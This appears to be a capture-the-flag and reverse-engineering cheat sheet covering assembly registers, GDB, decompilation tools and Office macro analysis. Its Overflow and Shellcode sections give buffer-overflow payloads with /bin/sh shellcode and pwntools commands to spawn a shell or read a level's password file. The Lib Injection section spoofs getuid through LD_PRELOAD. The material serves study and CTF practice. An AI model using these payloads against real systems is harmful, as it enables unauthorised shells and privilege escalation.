<picture>
    <source height="100px" srcset="https://user-images.githubusercontent.com/22857002/173634301-11eb983d-29a7-4efb-9be3-ab2179eab6b7.svg#gh-dark-mode-only" media="(prefers-color-scheme: dark)">
    <img height="100px" src="https://user-images.githubusercontent.com/28403617/172731874-c08c9da6-bac7-4836-b8bc-3744087d30a3.svg#gh-light-mode-only">
</picture>

---

- [ASM](#asm)
- [Binary ninja](#binary-ninja)
- [Decompile Python Executable](#decompile-python-executable)
- [GDB](#gdb)
- [Lib Injection](#lib-injection)
- [Macro Office PPTM](#macro-office-pptm)
- [OverFlow](#overflow)
- [Shellcode](#shellcode)

# ASM
### Variables
| x64     | x32       | What is ?               |
|:-------:|:---------:|-------------------------|
| RAX     | EAX       | Return Value            |
| RCX     | ECX       | Counter (or Fourth Arg) |
| RDX     | EDX       | Third Arg               | 
| RSI     | ESI       | Second Arg              |
| RDI     | EDI       | First Arg of Function   |
| RSP     | ESP       | Stack Pointer           |
| RIP     | EIP       | Next Instruction        |
| R8-R11  | r8d-r11d  | Scratch register        |
| R12-R15 | r12d-r15d | Preserved register      |

[Source](https://www.cs.uaf.edu/2017/fall/cs301/lecture/09_11_registers.html)

## Operation
| Operation             | Explication             |
|:----------------------|-------------------------|
| **MOV** size dest,src | dest ← src              |
| **LEA** dest,\[op\]   | dest ← addr op          |
| **PUSH** op           | Increase RSP & Store op |
| **POP** op            | Load op & Discrease RSP |
|                       |                         |
| **ADD** op1,op2       | op1 ← op1 + op2         |
| **SUB** op1,op2       | op1 ← op1 - op2         |
| **NEG** reg           | reg ← -reg              |
| **INC** reg           | reg ← reg + 1           |
| **DEC** reg           | reg ← reg - 1           |
|                       |                         |
| **AND** op1,op2       | op1 ← op1 & op2         |
| **OR**  op1,op2       | op1 ← op1 | op2         |
| **XOR** op1,op2       | op1 ← op1 ^ op2         |
|                       |                         |
| **CMP** op1,op2       | op1 - op2               |
| **TEST** op1,op2      | op1 & op2               |
| **JMP** op            | Jump to op              |

[Source - Page 21](https://www.lacl.fr/tan/asm)

# Overflow
### Basic
```bash
(python -c "import struct; print('A' * (100 - 0) + struct.pack('<I', 0xffffffff))")
```

### Shellcode
```bash
(python -c "import struct; print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (100 - 21) + struct.pack('<I', 0xffffffff))")
```

# Shellcode
### Cat
```bash
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.cat('/home/users/level05/.pass')); print(shell); print(len(shell))"
```

### Exec sh 1
```bash
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.sh()); print(shell); print(len(shell))"
```

### Exec sh 2
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
21
```

# GDB
### Command
```gdb
b *0x12345678      # Breakpoint
b strcpy           # Breakpoint
r                  # Run program
r < <(echo lol)    # Run with pipe
r arg1 arg2        # Run with arg
c                  # Continue
n                  # Next operation
set $eax=0x00      # Set variable
info register      # Show Register
```

### Print
```gdb
x/s "string"
x/d 53
x/x 0xff
help x

print $rax
```

- [Gdb cheatsheet - gabriellesc](https://gabriellesc.github.io/teaching/resources/GDB-cheat-sheet.pdf)
- [Gdb cheatsheet - darkdust](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)

### Get env address
```gdb
x/10s **(char***)&environ
```

## Peda
### Install
```bash
git clone https://github.com/longld/peda.git ~/.peda
echo "source ~/.peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

# Binary ninja
### Scrap code from html

```javascript
let result = '';
[...document.querySelectorAll('.LinearDisassemblyLine')].forEach(parent_elmt => {
  [...parent_elmt.children].forEach(children_elmt => {
    result += children_elmt.textContent
  });
  result +=  '\n'
});
console.log(result);
```

# Lib Injection
- Recreate getuid function
```C
uid_t	getuid(void)
{
	return (4242);
}
```
- compile
```bash
gcc -shared -fpic lib.c -o libnike.so -m32
```
- run and inject
```bash
LD_PRELOAD=./libnike.so ./exec
```

# Decompile Python Executable
Convert executable into .pyc
```bash
git clone https://github.com/extremecoders-re/pyinstxtractor
cd pyinstxtractor
python3 pyinstxtractor.py exec
```

Disassembly .pyc (compatible python 3.9.2)
```bash
git clone https://github.com/zrax/pycdc
cd pycdc
cmake
make
./pycdc file.pyc # Convert .pyc into .py
./pycdas file.pyc # Convert .pyc into byte-code disassembly
```

# Macro Office PPTM
### Install
```bash
sudo pip3 install oletools
```

### Decompress PPTM
```bash
olevba  -c file.pptm
```

- [ViperMonkey](https://github.com/decalage2/ViperMonkey)